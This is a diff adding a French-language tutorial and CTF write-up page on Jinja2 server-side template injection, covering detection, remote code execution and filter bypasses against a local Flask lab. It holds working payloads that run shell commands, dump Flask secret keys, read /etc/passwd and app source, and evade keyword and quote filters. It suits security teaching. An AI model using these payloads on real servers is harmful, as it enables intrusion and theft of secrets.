+      </div>
+    </div>
+  </header>
+
+  <div class="toc">
+    <div class="toc-title">Table des matières</div>
+    <ul class="toc-list">
+      <li><span class="toc-num">00</span><a href="#s0">C'est quoi un moteur de template ?</a></li>
+      <li><span class="toc-num">01</span><a href="#s1">Théorie SSTI</a></li>
+      <li><span class="toc-num">02</span><a href="#s2">Jinja2 Internals</a></li>
+      <li><span class="toc-num">03</span><a href="#s3">Détection</a></li>
+      <li><span class="toc-num">04</span><a href="#s4">Exploitation RCE</a></li>
+      <li><span class="toc-num">05</span><a href="#s5">Bypass de filtres</a></li>
+      <li><span class="toc-num">06</span><a href="#s6">Lab pratique CTF</a></li>
+      <li><span class="toc-num">07</span><a href="#s7">Ressources</a></li>
+    </ul>
+  </div>
+
+  <!-- 00 - INTRO -->
+  <section class="section" id="s0">
+    <div class="section-label">Phase <span>00</span></div>
+    <h2 class="section-title">C'est quoi un moteur de template ?</h2>
+
+    <p>
+      Un <strong>moteur de template</strong> (template engine) est une bibliothèque qui permet
+      de générer du contenu dynamique en combinant un <strong>template statique</strong> avec
+      des <strong>données variables</strong>. C'est la base de la plupart des applications
+      web modernes.
+    </p>
+
+    <p>
+      Imagine un site e-commerce : la page produit a toujours la même structure, mais le nom,
+      le prix et la description changent selon l'article affiché. Plutôt que d'écrire une page
+      HTML pour chaque produit, on écrit <em>un seul template</em> avec des variables.
+    </p>
+
+    <h3 class="subsection-title">Exemple basique</h3>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Jinja2 — template.html</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm">&lt;!-- Template Jinja2 --&gt;</span>
+<span class="kw">&lt;h1&gt;</span>Bonjour, <span class="payload">{{ username }}</span> !<span class="kw">&lt;/h1&gt;</span>
+<span class="kw">&lt;p&gt;</span>Vous avez <span class="payload">{{ message_count }}</span> nouveaux messages.<span class="kw">&lt;/p&gt;</span>
+
+<span class="payload">{% if is_admin %}</span>
+  <span class="kw">&lt;a href="/admin"&gt;</span>Panel Admin<span class="kw">&lt;/a&gt;</span>
+<span class="payload">{% endif %}</span></pre>
+    </div>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Python — ex1.py</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="kw">from</span> <span class="var">flask</span> <span class="kw">import</span> <span class="fn">Flask</span>, <span class="fn">render_template</span>
+
+<span class="var">app</span> = <span class="fn">Flask</span>(__name__)
+
+<span class="kw">@app</span>.<span class="fn">route</span>(<span class="str">"/profile"</span>)
+<span class="kw">def</span> <span class="fn">profile</span>():
+    <span class="kw">return</span> <span class="fn">render_template</span>(<span class="str">"template.html"</span>,
+        <span class="var">username</span>=<span class="str">"spectra"</span>,
+        <span class="var">message_count</span>=<span class="num">42</span>,
+        <span class="var">is_admin</span>=<span class="kw">True</span>
+    )
+
+<span class="kw">if</span> __name__ == <span class="str">"__main__"</span>:
+    <span class="var">app</span>.<span class="fn">run</span>(<span class="var">debug</span>=<span class="kw">True</span>)</pre>
+    </div>
+
+    <p>
+      Le moteur de template prend le fichier HTML, remplace <code>{{ username }}</code> par
+      <code>spectra</code>, <code>{{ message_count }}</code> par <code>42</code>, et génère
+      la page finale.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">http://127.0.0.1:5000/profile</span>
+      </div>
+      <div class="img-scroll"><img src="/ssti1/profile-result.png" alt="Rendu du template Jinja2 avec les variables Flask injectées" loading="lazy"></div>
+      <div class="terminal-caption">Rendu final — "Bonjour, spectra !" avec message_count et panel admin conditionnel</div>
+    </div>
+
+    <div class="callout callout-info">
+      <div class="callout-title">INFO — Moteurs populaires</div>
+      <p>
+        <strong>Python :</strong> Jinja2 (Flask, Django), Mako, Tornado<br>
+        <strong>PHP :</strong> Twig, Smarty, Blade (Laravel)<br>
+        <strong>Java :</strong> Freemarker, Velocity, Thymeleaf<br>
+        <strong>Ruby :</strong> ERB, Haml<br>
+        <strong>Node.js :</strong> Handlebars, EJS, Pug
+      </p>
+    </div>
+
+    <h3 class="subsection-title">Architecture de rendu</h3>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">Architecture — Moteur de template</span>
+      </div>
+      <div class="img-scroll"><img src="/ssti1/diagram-template-engine.png" alt="Schéma du pipeline de rendu Jinja2 : développeur + données → moteur → HTML" loading="lazy"></div>
+      <div class="terminal-caption">Pipeline : template statique + données dynamiques → moteur Jinja2 → HTML généré</div>
+    </div>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Python — vuln.py (test local minimal)</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="kw">from</span> <span class="var">jinja2</span> <span class="kw">import</span> <span class="fn">Template</span>
+<span class="var">name</span> = <span class="fn">input</span>(<span class="str">"Entre ton nom : "</span>)
+<span class="fn">print</span>(<span class="fn">Template</span>(<span class="str">"Bonjour "</span> + <span class="var">name</span>).<span class="fn">render</span>())</pre>
+    </div>
+
+    <p>
+      Ce fichier minimal reproduit la vulnérabilité hors Flask — parfait pour comprendre la
+      mécanique sans couche HTTP.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">Terminal — Tests locaux vuln.py</span>
+      </div>
+      <div class="img-scroll"><img src="/ssti1/vuln-py-test.png" alt="Tests locaux : injection arithmétique et tentative {{config}} hors Flask" loading="lazy"></div>
+      <div class="terminal-caption">Tests : <code>{{ 7*7 }}</code> → 49 · <code>{{ 7*'7' }}</code> → 7777777 · <code>{{config}}</code> → rien (objet Flask absent hors contexte Flask)</div>
+    </div>
+  </section>
+
+  <!-- 01 - THEORIE -->
+  <section class="section" id="s1">
+    <div class="section-label">Phase <span>01</span></div>
+    <h2 class="section-title">Théorie SSTI — Comment l'injection se produit</h2>
+
+    <p>
+      La <strong>Server-Side Template Injection (SSTI)</strong> survient quand l'application
+      web passe des données <strong>contrôlées par l'utilisateur directement dans le moteur
+      de template</strong> — non pas comme une valeur à afficher, mais comme du code template
+      à exécuter.
+    </p>
+
+    <h3 class="subsection-title">Code vulnérable vs code sécurisé</h3>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Python — VULNÉRABLE — app.py</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="kw">from</span> <span class="var">flask</span> <span class="kw">import</span> <span class="fn">Flask</span>, <span class="fn">request</span>
+<span class="kw">from</span> <span class="var">jinja2</span> <span class="kw">import</span> <span class="fn">Environment</span>
+
+<span class="var">app</span> = <span class="fn">Flask</span>(__name__)
+
+<span class="kw">@app</span>.<span class="fn">route</span>(<span class="str">"/greet"</span>)
+<span class="kw">def</span> <span class="fn">greet</span>():
+    <span class="var">name</span> = <span class="var">request</span>.<span class="var">args</span>.<span class="fn">get</span>(<span class="str">"name"</span>, <span class="str">"World"</span>)
+
+    <span class="cm"># ❌ VULNÉRABLE : l'input utilisateur est rendu comme template</span>
+    <span class="var">env</span> = <span class="fn">Environment</span>()
+    <span class="var">template</span> = <span class="var">env</span>.<span class="fn">from_string</span>(<span class="str">f"Hello </span><span class="payload">{name}</span><span class="str"> !"</span>)
+    <span class="kw">return</span> <span class="var">template</span>.<span class="fn">render</span>()</pre>
+    </div>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Python — SÉCURISÉ — app.py</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="kw">@app</span>.<span class="fn">route</span>(<span class="str">"/greet"</span>)
+<span class="kw">def</span> <span class="fn">greet</span>():
+    <span class="var">name</span> = <span class="var">request</span>.<span class="var">args</span>.<span class="fn">get</span>(<span class="str">"name"</span>, <span class="str">"World"</span>)
+
+    <span class="cm"># ✅ SÉCURISÉ : l'input est passé comme variable, pas comme template</span>
+    <span class="kw">return</span> <span class="fn">render_template_string</span>(<span class="str">"Hello {{ name }} !"</span>, <span class="var">name</span>=<span class="var">name</span>)</pre>
+    </div>
+
+    <div class="blocked-badge">
+      DIFFÉRENCE CLÉ — Dans le code vulnérable, si l'utilisateur envoie <code>name={{ 7*7 }}</code>, Jinja2 va <strong>évaluer</strong> l'expression et retourner <code>Hello 49 !</code>. L'input est traité comme du <strong>code</strong>, pas comme une donnée.
+    </div>
+
+    <h3 class="subsection-title">Pourquoi c'est grave ?</h3>
+
+    <p>
+      Jinja2 (et la plupart des moteurs de templates) expose par design un accès au runtime
+      Python. Si un attaquant peut injecter des expressions, il peut traverser l'arbre des
+      objets Python pour atteindre des fonctions système, lire des fichiers, et exécuter des
+      commandes.
+    </p>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Niveau d'impact</th>
+            <th>Ce qu'on peut faire</th>
+            <th>Exemple</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Medium</td>
+            <td>Afficher des variables internes</td>
+            <td><code>{{ config }}</code></td>
+          </tr>
+          <tr>
+            <td>High</td>
+            <td>Lire des fichiers arbitraires</td>
+            <td><code>open('/etc/passwd').read()</code></td>
+          </tr>
+          <tr>
+            <td>Critical</td>
+            <td>Remote Code Execution (RCE)</td>
+            <td><code>os.popen('id').read()</code></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- 02 - JINJA2 INTERNALS -->
+  <section class="section" id="s2">
+    <div class="section-label">Phase <span>02</span></div>
+    <h2 class="section-title">Jinja2 Internals — Sandbox et objets exposés</h2>
+
+    <p>
+      Pour exploiter efficacement le SSTI, il faut comprendre comment Jinja2 est construit en
+      interne — ce qu'il expose, comment naviguer dans ses objets, et comment atteindre
+      l'exécution de code.
+    </p>
+
+    <h3 class="subsection-title">La syntaxe Jinja2</h3>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Syntaxe</th>
+            <th>Rôle</th>
+            <th>Exemple</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td><code>{{ ... }}</code></td><td>Expression — affiche une valeur</td><td><code>{{ user.name }}</code></td></tr>
+          <tr><td><code>{% ... %}</code></td><td>Statement — contrôle (if, for, set)</td><td><code>{% if admin %}</code></td></tr>
+          <tr><td><code>{# ... #}</code></td><td>Commentaire (non rendu)</td><td><code>{# todo #}</code></td></tr>
+          <tr><td><code>|</code></td><td>Filtre — transforme une valeur</td><td><code>{{ name|upper }}</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3 class="subsection-title">Objets accessibles dans le contexte</h3>
+
+    <p>Quand Jinja2 rend un template, il expose des objets globaux :</p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Jinja2 — Objets globaux</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm"># Objets Flask/Jinja2 souvent exposés</span>
+<span class="payload">{{ config }}</span>           <span class="muted"># Configuration Flask (SECRET_KEY, DB credentials...)</span>
+<span class="payload">{{ request }}</span>          <span class="muted"># Objet requête HTTP</span>
+<span class="payload">{{ session }}</span>          <span class="muted"># Session utilisateur</span>
+<span class="payload">{{ g }}</span>                <span class="muted"># Variables globales Flask</span>
+<span class="payload">{{ self }}</span>             <span class="muted"># Référence au template lui-même</span>
+
+<span class="cm"># Accès à la config Flask</span>
+<span class="payload">{{ config.SECRET_KEY }}</span>
+<span class="payload">{{ config.items() }}</span>   <span class="muted"># Dump complet de la config</span></pre>
+    </div>
+
+    <div class="warn-badge">
+      Astuce terrain — <code>{{config}}</code> ne fonctionne que dans un contexte Flask. Dans un script Jinja2 brut (comme <code>vuln.py</code>), il faut passer par les variables globales Jinja2 : <code>lipsum</code>, <code>cycler</code>, <code>joiner</code>, <code>namespace</code>.
+    </div>
+
+    <h3 class="subsection-title">La classe de base de tous les objets Python</h3>
+
+    <p>
+      En Python, <strong>tout est un objet</strong>, et tout objet hérite de <code>object</code>.
+      Le chemin pour atteindre l'exécution de code part de ce principe fondamental :
+    </p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Python — Introspection</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm"># En Python standard :</span>
+<span class="str">""</span>.__class__                  <span class="muted"># &lt;class 'str'&gt;</span>
+<span class="str">""</span>.__class__.__mro__          <span class="muted"># (str, object)</span>
+<span class="str">""</span>.__class__.__mro__[<span class="num">1</span>]      <span class="muted"># &lt;class 'object'&gt;</span>
+<span class="str">""</span>.__class__.__mro__[<span class="num">1</span>].__subclasses__()
+<span class="muted"># [&lt;class 'type'&gt;, &lt;class 'int'&gt;, ..., &lt;class 'subprocess.Popen'&gt;, ...]</span></pre>
+    </div>
+
+    <div class="def-box">
+      <div class="def-term">Concept clé — MRO (Method Resolution Order)</div>
+      <div class="def-body">
+        <strong>__mro__</strong> (Method Resolution Order) est la liste des classes parentes
+        dans l'ordre de résolution. Pour une chaîne de caractères <code>str</code>, l'ordre
+        est <code>[str, object]</code>. <code>object</code> est la classe racine de tout
+        Python — toutes les classes en dérivent, ce qui nous donne accès à
+        <code>__subclasses__()</code> : la liste complète des classes chargées en mémoire.
+      </div>
+    </div>
+
+    <h3 class="subsection-title">La chaîne d'exploitation théorique</h3>
+
+    <div class="diagram">
+<pre>  <span class="d-accent">""</span>  (string quelconque dans le template)
+   │
+   ├─ <span class="d-accent">.__class__</span>           → str
+   │
+   ├─ <span class="d-accent">.__mro__[1]</span>          → object (classe racine Python)
+   │
+   ├─ <span class="d-accent">.__subclasses__()</span>    → [toutes les classes en mémoire]
+   │                           [..., Popen, ...]
+   │
+   └─ <span class="d-red">[N]("cmd", shell=True)</span>  → RCE 🔴</pre>
+    </div>
+  </section>
+
+  <!-- 03 - DETECTION -->
+  <section class="section" id="s3">
+    <div class="section-label">Phase <span>03</span></div>
+    <h2 class="section-title">Détection — Payloads de test</h2>
+
+    <p>
+      Avant d'exploiter, on doit confirmer que le point d'entrée est vulnérable, et identifier
+      quel moteur de template est utilisé.
+    </p>
+
+    <h3 class="subsection-title">Étape 1 — Baseline : comportement normal</h3>
+
+    <p>
+      On commence toujours par un input légitime pour observer le rendu attendu. Ici, la page
+      "Greet App" affiche simplement le nom saisi via le paramètre <code>name</code>.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">?name=frinds — Comportement normal</span>
+      </div>
+      <div class="img-scroll"><img src="/ssti1/test-01-frinds.png" alt="Rendu baseline : Hello frinds !" loading="lazy"></div>
+      <div class="terminal-caption">Baseline : l'input <code>frinds</code> est simplement affiché après "Hello"</div>
+    </div>
+
+    <h3 class="subsection-title">Étape 2 — Test arithmétique (universel)</h3>
+
+    <p>
+      Le test le plus simple consiste à injecter une expression mathématique. Si le résultat
+      est calculé, le moteur de template exécute l'input :
+    </p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Payloads de base</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm"># Injecte dans chaque paramètre (GET, POST, headers, cookies)</span>
+
+<span class="payload">{{7*7}}</span>          <span class="muted">→ si on voit "49" → SSTI confirmé</span>
+<span class="payload">{{7*'7'}}</span>        <span class="muted">→ Jinja2 : "7777777" | Twig : "49"</span>
+<span class="payload">${{7*7}}</span>         <span class="muted">→ test multi-syntaxe</span>
+<span class="payload">#{7*7}</span>           <span class="muted">→ Ruby/Smarty</span>
+<span class="payload"><%= 7*7 %></span>      <span class="muted">→ ERB (Ruby)</span>
+<span class="payload">${7*7}</span>           <span class="muted">→ Freemarker/Velocity</span></pre>
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">?name={{7*7}} — Résultat : 49</span>
+      </div>
+      <div class="img-scroll"><img src="/ssti1/test-02-7x7.png" alt="Test {{7*7}} renvoie Hello 49 — SSTI confirmé" loading="lazy"></div>
+      <div class="terminal-caption">L'expression <code>{{7*7}}</code> est évaluée → "Hello 49 !" — SSTI confirmé ✓</div>
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">?name={{7*'7'}} — Résultat : 7777777</span>
+      </div>
+      <div class="img-scroll"><img src="/ssti1/test-03-7x7str.png" alt="Test {{7*'7'}} renvoie Hello 7777777 — Jinja2 identifié" loading="lazy"></div>
+      <div class="terminal-caption">La multiplication de string donne "7777777" — signature <strong>Jinja2</strong> (Twig aurait retourné 49)</div>
+    </div>
+
+    <div class="result-badge">SSTI confirmé sur Jinja2 — passage à la phase d'exploitation</div>
+
+    <h3 class="subsection-title">Étape 3 — Détection Jinja2 spécifique</h3>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Jinja2 — Payloads de confirmation</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm"># Test de base</span>
+<span class="payload">{{7*7}}</span>                    <span class="muted">→ 49</span>
+<span class="payload">{{7*'7'}}</span>                  <span class="muted">→ 7777777 (Jinja2 répète la string)</span>
+
+<span class="cm"># Afficher la config Flask (preuve d'exécution)</span>
+<span class="payload">{{config}}</span>                 <span class="muted">→ dump de la config</span>
+<span class="payload">{{config.SECRET_KEY}}</span>     <span class="muted">→ clé secrète Flask</span>
+
+<span class="cm"># Accès aux classes</span>
+<span class="payload">{{''.__class__}}</span>           <span class="muted">→ &lt;class 'str'&gt;</span>
+<span class="payload">{{''.__class__.__mro__}}</span>  <span class="muted">→ (&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span>
+
+<span class="cm"># Error-based : provoquer une erreur révélatrice</span>
+<span class="payload">{{undefined_var}}</span>          <span class="muted">→ peut révéler le stack trace Jinja2</span></pre>
+    </div>
+
+    <h3 class="subsection-title">Chercher les points d'injection</h3>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Vecteur</th>
+            <th>Exemple</th>
+            <th>Test</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>Paramètre GET</td><td><code>?name=SPECTRA</code></td><td><code>?name={{7*7}}</code></td></tr>
+          <tr><td>Paramètre POST</td><td>Formulaire de login</td><td><code>username={{7*7}}</code></td></tr>
+          <tr><td>Header HTTP</td><td><code>User-Agent</code>, <code>Referer</code></td><td><code>User-Agent: {{7*7}}</code></td></tr>
+          <tr><td>Cookie</td><td><code>username=admin</code></td><td><code>username={{7*7}}</code></td></tr>
+          <tr><td>URL Path</td><td><code>/user/SPECTRA</code></td><td><code>/user/{{7*7}}</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- 04 - EXPLOITATION -->
+  <section class="section" id="s4">
+    <div class="section-label">Phase <span>04</span></div>
+    <h2 class="section-title">Exploitation — RCE Step by Step</h2>
+
+    <p>
+      Une fois la vulnérabilité confirmée sur Jinja2, voilà comment construire un payload RCE
+      en suivant la chaîne d'objets Python.
+    </p>
+
+    <h3 class="subsection-title">Étape 1 — Dump des sous-classes</h3>
+
+    <p>
+      On accède à <code>__subclasses__()</code> pour lister toutes les classes Python chargées
+      en mémoire. La liste peut contenir des centaines d'éléments — dont des classes très
+      utiles comme <code>subprocess.Popen</code>, <code>os._wrap_close</code>, ou
+      <code>warnings.catch_warnings</code>.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">?name={{''.__class__.__mro__[1].__subclasses__()}}</span>
+      </div>
+      <div class="img-scroll"><img src="/ssti1/dump-subclasses.png" alt="Dump complet des sous-classes Python chargées en mémoire" loading="lazy"></div>
+      <div class="terminal-caption">Dump massif : <code>subprocess.Popen</code>, <code>os._wrap_close</code>, <code>_frozen_importlib.BuiltinImporter</code>... toutes accessibles !</div>
+    </div>
+
+    <div class="warn-badge">
+      Note CTF — L'index de <code>subprocess.Popen</code> change selon la version Python et les modules chargés. En CTF, si 351 ne marche pas, cherche autour (300–450). Alternative plus robuste : utiliser <code>os._wrap_close</code> ou passer par les globals de <code>joiner</code> / <code>lipsum</code>.
+    </div>
+
+    <h3 class="subsection-title">Étape 2 — Payload RCE via globals Jinja2 (méthode recommandée)</h3>
+
+    <p>
+      Plutôt que de devoir trouver l'index exact de <code>Popen</code>, on peut passer par les
+      fonctions <strong>globales de Jinja2</strong> (<code>joiner</code>, <code>lipsum</code>,
+      <code>cycler</code>, <code>namespace</code>) qui possèdent toutes un accès direct à
+      <code>__globals__</code> → <code>os</code>. C'est la méthode la plus élégante et la
+      plus reproductible.
+    </p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Jinja2 — RCE via joiner</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm"># Chaîne complète : joiner → __init__ → __globals__ → os → popen</span>
+<span class="payload">{{ joiner.__init__.__globals__.os.popen("id").read() }}</span>
+
+<span class="cm"># Variantes équivalentes</span>
+<span class="payload">{{ lipsum.__globals__.os.popen("id").read() }}</span>
+<span class="payload">{{ cycler.__init__.__globals__.os.popen("id").read() }}</span>
+<span class="payload">{{ namespace.__init__.__globals__.os.popen("id").read() }}</span></pre>
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">?name={{joiner.__init__.__globals__.os.popen("id").read()}}</span>
+      </div>
+      <div class="img-scroll"><img src="/ssti1/rce-id.png" alt="RCE via joiner — commande id exécutée avec succès" loading="lazy"></div>
+      <div class="terminal-caption">RCE confirmé — <code>uid=1000(spectrax) gid=1000(spectrax) groups=1000(spectrax),10(wheel),964(docker) contexte=unconfined</code></div>
+    </div>
+
+    <h3 class="subsection-title">Étape 3 — Reconnaissance système</h3>
+
+    <p>
+      Une fois la RCE obtenue, on explore l'environnement pour comprendre le contexte :
+      fichiers présents, permissions, répertoire courant.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">?name={{joiner.__init__.__globals__.os.popen("ls -la").read()}}</span>
+      </div>
+      <div class="img-scroll"><img src="/ssti1/rce-ls.png" alt="Listing du répertoire via RCE — app.py, ssti_blog.html, templates, vuln.py visibles" loading="lazy"></div>
+      <div class="terminal-caption">Listing du répertoire de travail — <code>application1.py</code>, <code>app.py</code>, <code>ex1.py</code>, <code>ssti_blog.html</code>, <code>templates/</code>, <code>vuln.py</code></div>
+    </div>
+
+    <h3 class="subsection-title">Étape 4 — Lecture du code source et extraction du flag</h3>
+
+    <p>
+      Le fichier <code>app.py</code> contient la logique Flask complète. En le lisant, on
+      découvre la <strong>SECRET_KEY</strong> — qui est ici le flag.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">?name={{joiner.__init__.__globals__.os.popen("cat app.py").read()}}</span>
+      </div>
+      <div class="img-scroll"><img src="/ssti1/read-app-flag.png" alt="Lecture d'app.py révélant la SECRET_KEY = MZ{SSTI_M4ST3R_2026}" loading="lazy"></div>
+      <div class="terminal-caption">Code source exfiltré — la SECRET_KEY contient le flag : <strong>MZ{SSTI_M4ST3R_2026}</strong></div>
+    </div>
+
+    <div class="flag-box">
+      <div class="flag-label">Flag capturé</div>
+      <div class="flag-text">MZ{SSTI_M4ST3R_2026}</div>
+    </div>
+
+    <h3 class="subsection-title">Méthode alternative — via les builtins Python</h3>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Jinja2 — RCE via __builtins__</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm"># Via self.__init__.__globals__.__builtins__</span>
+<span class="payload">{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</span>
+
+<span class="cm"># Via __builtins__ d'une fonction connue</span>
+<span class="payload">{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}</span></pre>
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">Terminal — Test local vuln.py (self.__init__)</span>
+      </div>
+      <div class="img-scroll"><img src="/ssti1/vuln-py-rce.png" alt="Test local vuln.py démontrant la RCE via self.__init__.__globals__" loading="lazy"></div>
+      <div class="terminal-caption">Démonstration locale dans <code>vuln.py</code> : <code>self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()</code></div>
+    </div>
+  </section>
+
+  <!-- 05 - BYPASS -->
+  <section class="section" id="s5">
+    <div class="section-label">Phase <span>05</span></div>
+    <h2 class="section-title">Bypass — Filtres communs en CTF</h2>
+
+    <p>
+      En CTF et en pentest, des filtres ou une sandbox Jinja2 sont souvent en place pour
+      bloquer l'exploitation directe. Voilà les techniques de bypass les plus utilisées.
+    </p>
+
+    <h3 class="subsection-title">Bypass de filtres sur les mots-clés</h3>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Bypass — Strings bloquées</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm"># Si "__class__" est filtré → concaténation</span>
+<span class="payload">{{ ''["__cla""ss__"] }}</span>
+<span class="payload">{{ ''["__class__"[0:9]] }}</span>
+<span class="payload">{{ ''|attr("__class__") }}</span>      <span class="muted">← via filtre attr()</span>
+
+<span class="cm"># Si "." est filtré → bracket notation</span>
+<span class="payload">{{ ''["__class__"]["__mro__"][1] }}</span>
+
+<span class="cm"># Si les underscores sont filtrés → encodage</span>
+<span class="payload">{{ ''["\x5f\x5fclass\x5f\x5f"] }}</span>      <span class="muted">← \x5f = underscore</span>
+<span class="payload">{{ ''["\x5f\x5f""class""\x5f\x5f"] }}</span>
+
+<span class="cm"># Via request.args pour éviter les filtres inline</span>
+<span class="cm"># URL: ?x=__class__</span>
+<span class="payload">{{ ''[request.args.x] }}</span></pre>
+    </div>
+
+    <h3 class="subsection-title">Bypass de la sandbox Jinja2</h3>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Bypass — Sandbox</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm"># Si __class__ est bloqué → utiliser __base__</span>
+<span class="payload">{{ ().__class__.__bases__[0].__subclasses__() }}</span>
+
+<span class="cm"># Utiliser lipsum (fonction globale Jinja2)</span>
+<span class="payload">{{ lipsum.__globals__ }}</span>
+<span class="payload">{{ lipsum.__globals__["os"].popen("id").read() }}</span>
+
+<span class="cm"># Utiliser cycler</span>
+<span class="payload">{{ cycler.__init__.__globals__.os.popen("id").read() }}</span>
+
+<span class="cm"># Utiliser joiner</span>
+<span class="payload">{{ joiner.__init__.__globals__.os.popen("id").read() }}</span>
+
+<span class="cm"># Utiliser namespace</span>
+<span class="payload">{{ namespace.__init__.__globals__.os.popen("id").read() }}</span></pre>
+    </div>
+
+    <h3 class="subsection-title">Bypass des espaces bloqués</h3>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Bypass — Espaces</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm"># Remplacer les espaces par des tabulations ou newlines</span>
+<span class="payload">{{config}}</span>                   <span class="muted">← pas d'espace nécessaire</span>
+<span class="payload">{{''.__class__.__mro__[1]}}</span>  <span class="muted">← pas d'espace</span>
+
+<span class="cm"># Utiliser des newlines</span>
+<span class="payload">{{
+  ''.__class__
+}}</span>
+
+<span class="cm"># Si les espaces dans les commandes sont filtrés → $IFS (bash)</span>
+<span class="payload">{{ joiner.__init__.__globals__.os.popen('cat$IFS/etc/passwd').read() }}</span></pre>
+    </div>
+
+    <h3 class="subsection-title">Bypass des guillemets bloqués</h3>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Bypass — Quotes</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm"># Utiliser request.args pour passer les strings</span>
+<span class="cm"># GET /?cmd=id</span>
+<span class="payload">{{ joiner.__init__.__globals__.os.popen(request.args.cmd).read() }}</span>
+
+<span class="cm"># Utiliser chr() pour construire des strings</span>
+<span class="payload">{% set s = dict(i=1).__class__.__mro__[1].__subclasses__()[N].__init__.__globals__ %}</span></pre>
+    </div>
+
